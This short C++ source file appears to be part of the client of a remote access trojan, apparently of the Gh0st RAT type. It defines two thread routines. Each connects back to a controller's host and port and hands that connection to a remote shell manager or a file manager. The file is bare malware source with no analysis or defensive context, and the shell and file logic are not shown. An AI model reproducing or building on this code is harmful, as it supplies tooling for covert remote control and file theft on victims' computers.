#include "stdafx.h"
#include "loop.h"

UINT WINAPI Loop_ShellManager(void* managerHandle)
{
	CClientSocket	socketClient;
	if (!socketClient.Connect(CKernelManager::m_ServerHost, CKernelManager::m_ServerPort))
		return -1;

	CShellManager	manager(&socketClient,(DWORD)managerHandle);

	socketClient.run_event_loop();

	return 0;
}
UINT WINAPI Loop_FileManager(void* managerHandle)
{
	CClientSocket	socketClient;
	if (!socketClient.Connect(CKernelManager::m_ServerHost, CKernelManager::m_ServerPort))
		return -1;
	CFileManager	manager(&socketClient,(DWORD)managerHandle);
	socketClient.run_event_loop();
	return 0;
}